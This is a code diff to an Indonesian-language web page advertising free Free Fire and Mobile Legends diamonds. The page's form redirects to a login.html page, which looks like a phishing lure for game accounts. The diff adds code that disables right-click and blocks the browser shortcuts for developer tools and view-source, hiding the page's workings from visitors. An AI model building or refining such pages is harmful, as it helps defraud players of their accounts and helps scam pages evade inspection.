@@ -74,7 +74,7 @@
     }
   </style>
 </head>
-<body>
+<body oncontextmenu="return false" onkeydown="return blockInspect(event)">
 
   <header>💎 Diamond Free Fire Gratis</header>
 
@@ -143,9 +143,9 @@
       const logoContainer = document.getElementById("logoContainer");
       let logo = "";
       if (game === "Free Fire") {
-        logo = '<img src="https://upload.wikimedia.org/wikipedia/commons/2/29/Free_Fire_logo.png" class="logo-game">';
+        logo = '<img src="ff.jpg" alt="Free Fire" class="logo-game">';
       } else if (game === "Mobile Legends") {
-        logo = '<img src="https://upload.wikimedia.org/wikipedia/en/thumb/7/70/Mobile_Legends_Bang_Bang_logo.png/220px-Mobile_Legends_Bang_Bang_logo.png" class="logo-game">';
+        logo = '<img src="ml.jpg" alt="Mobile Legends" class="logo-game">';
       }
       logoContainer.innerHTML = logo;
     }
@@ -158,6 +158,18 @@
         pesan.innerText = "❌ Semua data harus diisi!";
       } else {
         window.location.href = "login.html";
+      }
+    }
+
+    // Proteksi kode: blok inspect element
+    function blockInspect(e) {
+      if (
+        e.keyCode === 123 || // F12
+        (e.ctrlKey && e.shiftKey && (e.keyCode === 73 || e.keyCode === 74)) || // Ctrl+Shift+I / Ctrl+Shift+J
+        (e.ctrlKey && e.keyCode === 85) // Ctrl+U
+      ) {
+        alert("Akses kode sumber dibatasi.");
+        return false;
       }
     }
   </script>
